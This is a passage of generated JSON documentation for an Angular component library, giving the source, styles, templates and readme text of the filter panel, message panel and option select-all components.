      "sourceCode": "import {\n  AfterViewInit,\n  ChangeDetectorRef,\n  Component,\n  Directive,\n  EventEmitter,\n  HostBinding,\n  Input,\n  OnInit,\n  Output,\n  ViewChild,\n  ViewContainerRef,\n  ViewEncapsulation\n} from '@angular/core';\nimport { FilterForm, FilterList } from './filter';\n\n/**\n * Sto filter panel is an extension of mat-accordion\n */\n@Component({\n  selector: 'sto-filter-panel',\n  templateUrl: './sto-filter-panel.component.html',\n  encapsulation: ViewEncapsulation.None,\n  styleUrls: [ './sto-filter-panel.component.scss' ]\n})\nexport class StoFilterPanelComponent implements OnInit, AfterViewInit {\n  set contentHeight(contentHeight: number) {\n    this._contentHeight = contentHeight;\n  }\n\n  get contentHeight(): number {\n    return this._contentHeight;\n  }\n\n  /**\n   * If the filter panel should be expandable. Default true.\n   */\n  @Input()\n  expandable = true;\n\n  /**\n   * If the filter panel should be expanded by default. Default false.\n   */\n  @Input()\n  expanded: boolean;\n\n  /**\n   * List of active filters.\n   */\n  @Input()\n  filterList: FilterList[];\n\n  /**\n   * Emits {isExpanded: boolean, contentHeight: number } where\n   * isExpanded is true if the panel opens and false if not.\n   * ContentHeight is the height of the expanded content i pixels.\n   *  {EventEmitter<{isExpanded: boolean, contentHeight: number }>}\n   */\n  @Output() toggled = new EventEmitter<{ isExpanded: boolean, contentHeight: number }>();\n  /**\n   * Emits when a filter should be cleared (if applicable)\n   */\n  @Output()\n  clearFilter = new EventEmitter();\n\n  /**\n   * Buttons and actions on the left side of the separator if both table and filter actions is present.\n   */\n  @ViewChild('tableActions') contentWrapper: { nativeElement: HTMLElement; };\n  /**\n   * Buttons and actions on the right side of the separator if both table and filter actions is present.\n   */\n  @ViewChild('filterActions') contentWrapper2: { nativeElement: HTMLElement; };\n  @ViewChild('filterForm') filterForm: { nativeElement: HTMLElement; };\n\n  @Input()\n  public host: FilterForm<Record<string, unknown>>;\n  private _contentHeight: number;\n\n  public hasSeperator = false;\n\n  constructor(\n    private cdr: ChangeDetectorRef,\n    private vcRef: ViewContainerRef) {\n    try {\n      // eslint-disable-next-line @typescript-eslint/no-explicit-any\n      this.host = ( this.vcRef as any )._view.context;\n    } catch ( ex ) {\n      // most likely this fails only for tests after Ivy (Angular 9), as it no longer wraps with a component.\n    }\n  }\n\n  public toggle() {\n    this.expanded = !this.expanded;\n    this.setContentHeight();\n    this.toggled.emit({ isExpanded: this.expanded, contentHeight: this.contentHeight });\n  }\n\n  ngOnInit() {\n    if ( this.expandable ) {\n      if ( this.expanded === undefined ) {\n        this.expanded = true;\n      }\n    } else {\n      this.expanded = false;\n    }\n\n    this.needSeperator();\n  }\n\n  ngAfterViewInit() {\n    this.needSeperator();\n    this.setContentHeight();\n  }\n\n  private setContentHeight() {\n    const element = this.filterForm.nativeElement;\n    if ( element ) {\n      const contentArea = element.parentElement;\n      this.contentHeight = contentArea?.offsetHeight || 0;\n    }\n  }\n\n  public needSeperator() {\n    this.hasSeperator = false;\n    if ( this.contentWrapper && this.contentWrapper2 ) {\n      const el1 = this.contentWrapper.nativeElement;\n      const el2 = this.contentWrapper2.nativeElement;\n      if ( el1.children && el2.children ) {\n        if ( el1.children.length > 0 && el2.children.length > 0 ) {\n          const hasActionButtons = el1.children[ 0 ].children.length > 0;\n          const hasTableButtons = el2.children[ 0 ].children.length > 0;\n\n          this.hasSeperator = hasActionButtons && hasTableButtons;\n          this.cdr.detectChanges();\n        }\n      }\n    }\n\n\n  }\n\n  _clearFilter(key: string, index?: number) {\n    if (index === null) {\n      return;\n    }\n    try {\n      this.host.clearFilter(key, index);\n    } catch {\n      this.clearFilter.emit({ key, index });\n    }\n  }\n}\n\n/**\n * <mat-panel-description> directive.\n *\n * This direction is to be used inside of the MdExpansionPanelHeader component.\n */\n@Directive({\n  // eslint-disable-next-line @angular-eslint/directive-selector\n  selector: 'sto-filter-title'\n})\nexport class StoFilterTitle {\n}\n\n\n@Directive({\n  selector: 'sto-filter-table-actions'\n})\nexport class StoFilterTableActions {\n  @HostBinding('class.sto-filter-table-actions')\n  className = true;\n}\n\n@Directive({\n  selector: 'sto-filter-actions'\n})\nexport class StoFilterActions {\n}\n\n@Component({\n  selector: 'sto-filter-actions-bar',\n  template: `\n    <ng-content></ng-content>\n    <button mat-icon-button\n            class=\"toggle-expand-button\"\n            *ngIf=\"expandable\"\n            title=\"Toggle filter panel\"\n            (click)=\"toggle.emit()\">\n      <mat-icon>filter_list</mat-icon>\n    </button>\n\n  `\n})\n// eslint-disable-next-line @angular-eslint/component-class-suffix\nexport class StoFilterActionsBar {\n  @HostBinding('class.sto-filter-actions')\n  hasClass = true;\n\n  @Input() set expanded(expanded: boolean) {\n    this._expanded = expanded;\n  }\n\n  get expanded(): boolean {\n    return this._expanded;\n  }\n\n  @Input() expandable: boolean;\n  private _expanded: boolean;\n\n  @Output() toggle = new EventEmitter<void>();\n\n  // eslint-disable-next-line @typescript-eslint/no-unused-vars\n  onChange(event: unknown) {\n    // console.log($event);\n  }\n\n\n}\n\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": "@use '@angular/material' as mat;\n\n$sto-filter-header-font-size: 18px;\n$sto-filter-header-line-height: 24px;\n\n.sto-filter {\n\n  .mat-button-toggle {\n    &-standalone.mat-button-toggle-appearance-standard {\n      border: 0;\n    }\n  }\n\n  box-shadow: none !important;\n\n  border-top-left-radius: 3px;\n  border-top-right-radius: 3px;\n\n  .mat-expansion-panel {\n    border-radius: 2px;\n  }\n\n  .mat-expansion-panel-header {\n    border-bottom: solid 1px var(--divider);\n\n    padding: 0 8px;\n    cursor: default;\n    border-bottom-left-radius: 0;\n    border-bottom-right-radius: 0;\n\n    &-title {\n      align-items: center;\n    }\n  }\n\n  .mat-expansion-panel-body {\n    padding: 24px 16px 0 16px;\n    margin: 0;\n  }\n\n  .mat-expansion-panel-header[aria-disabled=true] {\n    color: inherit;\n  }\n\n\n  .sto-filter-table-actions {\n\n    padding: 0;\n\n  }\n\n  .sto-filter-actions {\n    padding: 0 0 0 8px;\n\n\n  }\n\n  sto-filter-actions {\n    height: 32px;\n  }\n\n  .sto-filter-table-actions, .sto-filter-actions {\n    display: flex;\n    align-items: center;\n\n    .mat-icon {\n      cursor: pointer;\n    }\n\n    .mat-icon-button {\n    }\n  }\n\n\n  .mat-expansion-panel-header {\n    border-radius: 2px;\n  }\n\n\n  .mat-button-toggle-standalone {\n    width: 32px;\n    height: 32px;\n\n    .mat-button-toggle-label {\n      margin: 0;\n    }\n\n    .mat-button-toggle-label-content {\n      height: 100%;\n      display: flex;\n      align-items: center;\n      justify-content: center;\n    }\n  }\n\n  .separator {\n    display: inline-block;\n    width: 1px;\n    height: 24px;\n    margin: 8px 4px;\n  }\n\n  .content-wrapper {\n    display: flex;\n  }\n\n\n}\n\n",
          "styleUrl": "./sto-filter-panel.component.scss"
        }
      ],
      "stylesData": "",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "cdr",
            "type": "ChangeDetectorRef",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "vcRef",
            "type": "ViewContainerRef",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 81,
        "jsdoctags": [
          {
            "name": "cdr",
            "type": "ChangeDetectorRef",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "vcRef",
            "type": "ViewContainerRef",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "implements": [
        "OnInit",
        "AfterViewInit"
      ],
      "accessors": {
        "contentHeight": {
          "name": "contentHeight",
          "setSignature": {
            "name": "contentHeight",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "contentHeight",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 28,
            "jsdoctags": [
              {
                "name": "contentHeight",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "contentHeight",
            "type": "number",
            "returnType": "number",
            "line": 32
          }
        }
      },
      "readme": "<h3 id=\"sto-filter-panel\">Sto filter panel</h3>\n<p>Filter panel is a togglable panel with a header and a content area, and is an extension of expansion panel from material.\nHas build in content areas for title, table actions and filter actions.\nThe panel has a toggle button that open and closes the content area and emits an event with the height of the content area.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot; (toggled)=&quot;toggleService.isToggled.emit($event)&quot;&gt;\n    &lt;sto-filter-title&gt;Integration Logs&lt;/sto-filter-title&gt;\n        &lt;sto-filter-table-actions&gt;\n           &lt;button mat-button&gt;\n           New&lt;mat-icon&gt;arrow_drop_down&lt;/mat-icon&gt;\n           &lt;/button&gt;    \n        &lt;/sto-filter-table-actions&gt;\n           &lt;sto-filter-actions&gt;\n                &lt;button mat-icon-button&gt;\n                  &lt;mat-icon&gt;refresh&lt;/mat-icon&gt;\n               &lt;/button&gt;\n            &lt;/sto-filter-actions&gt;\n        &lt;form class=&quot;sto-form sto-grid sto-grid--6&quot; [formGroup]=&quot;form&quot; &gt;\n             &lt;div class=&quot;sto-grid__column&quot;&gt;\n                   &lt;mat-form-field&gt;\n                     ...\n                    &lt;/mat-form-field&gt;\n             &lt;/div&gt;\n        &lt;/form&gt;\n&lt;/sto-filter-panel&gt;</code></pre></div><p>####Selector / Content projection</p>\n<h5 id=\"sto-filter-title\">sto-filter-title</h5>\n<p>The title. Usually just a string but could be html.</p>\n<h5 id=\"sto-filter-table-actions\">sto-filter-table-actions</h5>\n<p>Buttons and actions on the left side of the separator if both table and filter actions is present.\n(The name is from a time where all actions left of the separator was related to the table).</p>\n<h5 id=\"sto-filter-actions\">sto-filter-actions</h5>\n<p>Buttons and actions on the right side of the separator if both table and filter actions is present.\n(The name is from a time where all actions right of the separator was related to the table).</p>\n<p>####Input</p>\n<h5 id=\"expandable\">expandable</h5>\n<p>If the filter panel should be expandable. Default true.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot;&gt;</code></pre></div><h5 id=\"expanded\">expanded</h5>\n<p>If the filter panel should be expanded by default. Default false.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expanded]=&quot;true&quot;&gt;</code></pre></div><p>####Output</p>\n<h5 id=\"toggled\">toggled</h5>\n<p>Emits {isExpanded: boolean, contentHeight: number } where\nisExpanded is true if the panel opens and false if not.\nContentHeight is the height of the expanded content. </p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel (toggled)=&quot;onToggle($event)&quot;&gt;</code></pre></div>",
      "templateData": "<mat-expansion-panel [disabled]=\"true\"\n                     [expanded]=\"expanded\"\n                     #panel\n                     [hideToggle]=\"true\"\n                     [ngClass]=\"{'sto-filter' : true}\">\n  <mat-expansion-panel-header [expandedHeight]=\"'40px'\"\n                              [collapsedHeight]=\"'40px'\">\n    <mat-panel-title>\n      <ng-content select=\"sto-filter-title\"></ng-content>\n      <mat-chip-list [style.opacity]=\"panel.expanded ? 0 : 1\"\n                     *ngIf=\"filterList\"\n                     style=\"margin-left: 16px\">\n        <mat-chip (removed)=\"_clearFilter(f.key, f.index)\"\n                  *ngFor=\"let f of filterList\"\n                  [removable]=\"true\"\n                  [selected]=\"true\"\n                  [value]=\"f.key\"\n                  style=\"margin: 2px 4px\">\n          <span style=\"margin-bottom: -4px\">{{ f.value }}</span>\n          <mat-icon matChipRemove>cancel</mat-icon>\n\n        </mat-chip>\n      </mat-chip-list>\n    </mat-panel-title>\n    <span class=\"content-wrapper\"\n          #tableActions>\n      <ng-content select=\"sto-filter-table-actions\">\n\n      </ng-content>\n\n    </span>\n\n    <span class=\"content-wrapper\"\n          #filterActions>\n      <sto-filter-actions-bar #contentWrapper2\n                              *ngIf=\"expandable\"\n                              [expanded]=\"expanded\"\n                              [expandable]=\"expandable\"\n                              (toggle)=\"toggle()\">\n\n        <ng-content select=\"sto-filter-actions\"></ng-content>\n\n      </sto-filter-actions-bar>\n    </span>\n  </mat-expansion-panel-header>\n  <div class=\"sto-filter-form\"\n       #filterForm>\n    <ng-content></ng-content>\n  </div>\n</mat-expansion-panel>\n\n"
    },
    {
      "name": "StoMessagePanelComponent",
      "id": "component-StoMessagePanelComponent-818cf39359e5e6fe883b115a9c92547a0d91c396fda13f632874b0ab367b14bae1b779f7b83edae25ba5e2969d97c1798b7e8fb419a58ed3c51bf3213b10f2e7",
      "file": "libs/common/src/lib/sto-message-panel/sto-message-panel.component.ts",
      "changeDetection": "ChangeDetectionStrategy.OnPush",
      "encapsulation": [
        "ViewEncapsulation.None"
      ],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-message-panel",
      "styleUrls": [
        "./sto-message-panel.component.scss"
      ],
      "styles": [],
      "templateUrl": [
        "./sto-message-panel.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "color",
          "defaultValue": "'primary'",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 40,
          "type": "\"primary\" | \"accent\" | \"warning\" | \"danger\" | \"success\"",
          "decorators": []
        },
        {
          "name": "dismissable",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nDetermines if the message can be dismissed - typically used for showing and hiding errors.\n",
          "description": "<p>Determines if the message can be dismissed - typically used for showing and hiding errors.</p>\n",
          "line": 72,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "icon",
          "defaultValue": "'info'",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 64,
          "type": "\"info\" | \"warning\" | \"error\"",
          "decorators": []
        },
        {
          "name": "severity",
          "defaultValue": "'info'",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 62,
          "type": "\"info\" | \"warning\" | \"error\"",
          "decorators": []
        }
      ],
      "outputsClass": [
        {
          "name": "dismissed",
          "defaultValue": "new EventEmitter()",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nEmits an event on (dismissed) when the user clicks the dismiss icon\n",
          "description": "<p>Emits an event on (dismissed) when the user clicks the dismiss icon</p>\n",
          "line": 68,
          "type": "EventEmitter"
        }
      ],
      "propertiesClass": [],
      "methodsClass": [
        {
          "name": "ngAfterViewInit",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 97,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "ngOnChanges",
          "args": [
            {
              "name": "changes",
              "type": "SimpleChanges",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 77,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "changes",
              "type": "SimpleChanges",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "setDismissableClass",
          "args": [
            {
              "name": "dismissable",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "el",
              "type": "HTMLElement",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 89,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ],
          "jsdoctags": [
            {
              "name": "dismissable",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "el",
              "type": "HTMLElement",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [
        {
          "name": "class.error",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 53,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "class.info",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 48,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "class.warning",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 43,
          "type": "boolean",
          "decorators": []
        }
      ],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import {\n  AfterViewInit,\n  ChangeDetectionStrategy,\n  Component,\n  ElementRef,\n  EventEmitter,\n  HostBinding,\n  Input,\n  OnChanges,\n  Output,\n  SimpleChanges,\n  ViewEncapsulation\n} from '@angular/core';\n\nconst COLORS = [\n  'primary', 'accent', 'warning', 'danger', 'success'\n];\n\n@Component({\n  selector: 'sto-message-panel',\n  templateUrl: './sto-message-panel.component.html',\n  styleUrls: [ './sto-message-panel.component.scss' ],\n  changeDetection: ChangeDetectionStrategy.OnPush,\n  encapsulation: ViewEncapsulation.None\n})\n/**\n * Message panel to display inline info boxes.\n * Can be of severity warning, error or info.\n *\n * @example\n *\n * <sto-message-panel severity=\"warning\"></sto-message-panel>\n * <sto-message-panel severity=\"info\"></sto-message-panel>\n * <sto-message-panel severity=\"error\"></sto-message-panel>\n * <sto-message-panel *ngIf=\"err\" [dismissable]=\"true\"\n *    (dismissed)=\"err = null\" severity=\"warning\">{{ err }}</sto-message-panel>\n */\nexport class StoMessagePanelComponent implements OnChanges, AfterViewInit {\n  @Input()\n  color: 'primary' | 'accent' | 'warning' | 'danger' | 'success' = 'primary';\n\n  @HostBinding('class.warning')\n  get warning() {\n    return this.severity === 'warning';\n  }\n\n  @HostBinding('class.info')\n  get info() {\n    return this.severity === 'info';\n  }\n\n  @HostBinding('class.error')\n  get error() {\n    return this.severity === 'error';\n  }\n\n  /**\n   * @deprecated\n   * severity was used to signify behaviour. Now you should use icon + color.\n   */\n  @Input()\n  severity: 'info' | 'warning' | 'error' = 'info';\n  @Input()\n  icon: 'info' | 'warning' | 'error' = 'info';\n  /**\n   * Emits an event on (dismissed) when the user clicks the dismiss icon\n   */\n  @Output() dismissed = new EventEmitter();\n  /**\n   * Determines if the message can be dismissed - typically used for showing and hiding errors.\n   */\n  @Input() dismissable: boolean;\n\n  constructor(private elRef: ElementRef<HTMLElement>) {\n  }\n\n  ngOnChanges(changes: SimpleChanges): void {\n    const el = this.elRef.nativeElement;\n    if ( changes.color ) {\n      el.classList.remove(...COLORS.map(c => `mat-${c}`));\n      el.classList.add(`mat-${changes.color.currentValue}`);\n    }\n    if ( changes.dismissable ) {\n      const dismissable = changes.dismissable.currentValue;\n      this.setDismissableClass(dismissable, el);\n    }\n  }\n\n  private setDismissableClass(dismissable: boolean, el: HTMLElement) {\n    if ( dismissable ) {\n      el.classList.add('sto-message-panel--dismissable');\n    } else {\n      el.classList.remove('sto-message-panel--dismissable');\n    }\n  }\n\n  ngAfterViewInit(): void {\n    const color = this.color;\n    this.elRef.nativeElement.classList.add(`mat-${color}`, 'sto-message-panel');\n    this.setDismissableClass(this.dismissable, this.elRef.nativeElement);\n  }\n}\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": ".sto-message-panel {\n  width: 100%;\n  border: 1px solid;\n  display: flex;\n  border-radius: 2px;\n  padding: 12px;\n\n  &--dismissable {\n    padding: 4px 12px;\n  }\n\n  position: relative;\n  font-weight: 500;\n  font-size: 13px;\n\n  &__content-wrapper {\n    align-items: center;\n  }\n}\n\n\n.sto-message-panel {\n  &__icon-wrapper {\n    display: flex;\n    flex-direction: column;\n    justify-content: center;\n    height: auto;\n    flex-grow: 1;\n    min-width: 42px;\n    max-width: 42px;\n  }\n  &__content-wrapper {\n    padding-top: 2px;\n    flex-grow: 99;\n  }\n  &__dismiss-wrapper {\n    display: flex;\n    flex-direction: column;\n    justify-content: center;\n    height: auto;\n    flex-grow: 1;\n    max-width: 42px;\n  }\n}\n\n::ng-deep ul {\n  margin: 0;\n  list-style: none;\n  padding: 0;\n}\n\n::ng-deep .mat-typography p {\n  margin: 0;\n}\n\n//SHOULD BE REWRITTEN OR REMOVE ENCAPSULATION\n\n.sto-message-panel__sticky {\n  position: sticky;\n  &--bottom {\n    padding-top: 8px;\n    bottom: 0;\n  }\n  &--top {\n    top: 0;\n    padding-bottom: 8px;\n  }\n  z-index: 25;\n}\n\n.sto-has-action-footer, .sto-message-panel__pad--bottom {\n  .sto-message-panel__sticky--bottom {\n    bottom: 76px;\n    width: 100%;\n  }\n}\n\nsto-message-panel {\n  .sto-message-panel__content-wrapper {\n    display: flex;\n  }\n  .sto-message-panel__action-button {\n    height: 24px;\n    line-height: 24px;\n  }\n}\n",
          "styleUrl": "./sto-message-panel.component.scss"
        }
      ],
      "stylesData": "",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "elRef",
            "type": "ElementRef<HTMLElement>",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 72,
        "jsdoctags": [
          {
            "name": "elRef",
            "type": "ElementRef<HTMLElement>",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "implements": [
        "OnChanges",
        "AfterViewInit"
      ],
      "accessors": {
        "warning": {
          "name": "warning",
          "getSignature": {
            "name": "warning",
            "type": "",
            "returnType": "",
            "line": 43
          }
        },
        "info": {
          "name": "info",
          "getSignature": {
            "name": "info",
            "type": "",
            "returnType": "",
            "line": 48
          }
        },
        "error": {
          "name": "error",
          "getSignature": {
            "name": "error",
            "type": "",
            "returnType": "",
            "line": 53
          }
        }
      },
      "readme": "<h3 id=\"stomessagepanel\">StoMessagePanel</h3>\n<p>StoMessagePanel is used to display contextual messages using 3 different modes - info, warning and error</p>\n<h5 id=\"usage\">Usage</h5>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-message-panel [dismissable]=&quot;true|false&quot;\n(dismissed)=&quot;onDismiss()&quot;\ncolor=&quot;primary|accent|warn&quot;&gt;{{ message }}&lt;/sto-message-panel&gt;</code></pre></div><h5 id=\"inputs\">Inputs</h5>\n<ul>\n<li>[dismissable] determines if the alert can be dismissed. Note that the component does not handle dismissing, and you need to use the (dismissed) event yourself.</li>\n<li>[color] determines how the component should be styled. Uses Angular Material&#39;s ThemePalette</li>\n<li>[icon] determines the icon</li>\n</ul>\n<h5 id=\"outputs\">Outputs</h5>\n<ul>\n<li>(dismissed) emits when the close-button (X) is clicked to dismiss the message.</li>\n</ul>\n",
      "templateData": "<div class=\"sto-message-panel__icon-wrapper\">\n  <mat-icon>{{ icon + '_outline' || severity }}</mat-icon>\n</div>\n<div class=\"sto-message-panel__content-wrapper\">\n  <ng-content></ng-content>\n</div>\n<div *ngIf=\"dismissable\"\n     class=\"sto-message-panel__dismiss-wrapper mat__icon--clickable\">\n  <button mat-icon-button\n          (click)=\"dismissed.emit()\">\n    <mat-icon>close</mat-icon>\n  </button>\n</div>\n"
    },
    {
      "name": "StoOptionSelectAllComponent",
      "id": "component-StoOptionSelectAllComponent-a524b696270d62d5715540bbc158f0ebdbaad14d4a08cc7809d0490b545afa71b91e837a5a05227de504e2dac0d0a2c33cb2497499173f10686756de5c6baafd",
      "file": "libs/form/src/lib/sto-option-select-all/sto-option-select-all.component.ts",
      "changeDetection": "ChangeDetectionStrategy.OnPush",
      "encapsulation": [],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-option-select-all",
      "styleUrls": [
        "./sto-option-select-all.component.scss"
      ],
      "styles": [],
      "templateUrl": [
        "./sto-option-select-all.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [],
      "outputsClass": [],
      "propertiesClass": [
        {
          "name": "_value",
          "defaultValue": "[]",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Array<T>",
          "optional": false,
          "description": "",
          "line": 29,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "destroyed",
          "defaultValue": "new Subject()",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 38,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "options",
          "defaultValue": "[]",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Array<>",
          "optional": false,
          "description": "",
          "line": 28,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "state",
          "defaultValue": "'checked'",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "MatPseudoCheckboxState",
          "optional": false,
          "description": "",
          "line": 26
        }
      ],
      "methodsClass": [
        {
          "name": "areArraysEqual",
          "args": [
            {
              "name": "a",
              "type": "Array<T>",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "b",
              "type": "Array<T>",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "boolean",
          "typeParameters": [],
          "line": 110,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ],
          "jsdoctags": [
            {
              "name": "a",
              "type": "Array<T>",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "b",
              "type": "Array<T>",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "ngAfterViewInit",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 46,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "ngOnDestroy",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 79,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "onSelectAllClick",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 84,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "updateState",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 94,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import {\n  AfterViewInit,\n  ChangeDetectionStrategy,\n  ChangeDetectorRef,\n  Component,\n  ElementRef,\n  Host,\n  NgModule,\n  OnDestroy,\n  Optional,\n} from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { MatPseudoCheckboxState } from '@angular/material/core';\nimport { MatSelect } from '@angular/material/select';\nimport { takeUntil } from 'rxjs/operators';\nimport { Subject } from 'rxjs';\nimport { MatCheckboxModule } from '@angular/material/checkbox';\n\n@Component({\n  selector: 'sto-option-select-all',\n  templateUrl: './sto-option-select-all.component.html',\n  styleUrls: [ './sto-option-select-all.component.scss' ],\n  changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class StoOptionSelectAllComponent<T = unknown> implements AfterViewInit, OnDestroy {\n  state: MatPseudoCheckboxState = 'checked';\n\n  private options: Array<unknown> = [];\n  private _value: Array<T> = [];\n  set value(value: Array<T>) {\n    this._value = value ?? [];\n  }\n\n  get value() {\n    return this._value;\n  }\n\n  private destroyed = new Subject();\n\n  constructor(\n    @Host() @Optional() private matSelect: MatSelect,\n    private cdr: ChangeDetectorRef,\n    private el: ElementRef<HTMLElement>) {\n  }\n\n  ngAfterViewInit() {\n    if ( !this.matSelect ) {\n      this.el.nativeElement.style.display = 'none';\n      return;\n    }\n    this.options = this.matSelect.options?.map(x => x.value) ?? [];\n    this.matSelect.options?.changes\n      .pipe(takeUntil(this.destroyed))\n      .subscribe(() => {\n        this.options = this.matSelect.options.map(x => x.value);\n        this.updateState();\n      });\n\n    if (this.matSelect.ngControl?.control) {\n      // Null-checked via isControl\n      // eslint-disable-next-line @typescript-eslint/ban-ts-comment\n        // @ts-ignore\n      this.value = this.matSelect.ngControl.control.value;\n        this.matSelect.ngControl.valueChanges\n          ?.pipe(takeUntil(this.destroyed))\n          .subscribe(res => {\n            this.value = res;\n            this.updateState();\n          });\n    } else {\n      this.el.nativeElement.style.display = 'none';\n    }\n    // ExpressionChangedAfterItHasBeenCheckedError fix...\n    setTimeout(() => {\n      this.updateState();\n    });\n  }\n\n  ngOnDestroy() {\n    this.destroyed.next();\n    this.destroyed.complete();\n  }\n\n  onSelectAllClick() {\n    if (this.state === 'checked') {\n      this.matSelect.ngControl?.control?.setValue([]);\n    }\n    else {\n      this.matSelect.ngControl?.control?.setValue(this.options);\n    }\n\n  }\n\n  private updateState() {\n    // eslint-disable-next-line @typescript-eslint/ban-ts-comment\n    // @ts-ignore\n    const areAllSelected = this.areArraysEqual(this.value, this.options);\n    if (areAllSelected) {\n      this.state = 'checked';\n    }\n    else if (this.value.length > 0) {\n      this.state = 'indeterminate'\n    }\n    else {\n      this.state = 'unchecked';\n    }\n    this.cdr.markForCheck();\n  }\n\n  private areArraysEqual(a: Array<T>, b: Array<T>) {\n    if (!a || !b) {\n      return false;\n    }\n    return [...a].sort().join(',') === [...b].sort().join(',');\n  }\n}\n\n@NgModule({\n  imports: [ CommonModule, MatCheckboxModule ],\n  declarations: [StoOptionSelectAllComponent],\n  exports: [StoOptionSelectAllComponent],\n})\nexport class StoOptionSelectAllComponentModule {}\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": ".mat-option {\n  border-bottom: 1px solid var(--divider);\n  height: 3.5em;\n  line-height: 3.5em;\n}\n\n:host {\n  position: sticky;\n  top: 0;\n  display: block;\n  z-index: 30;\n  background-color: var(--bg-card);\n}\n",
          "styleUrl": "./sto-option-select-all.component.scss"
        }
      ],
      "stylesData": "",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "matSelect",
            "type": "MatSelect",
            "deprecated": false,
            "deprecationMessage": ""
          },
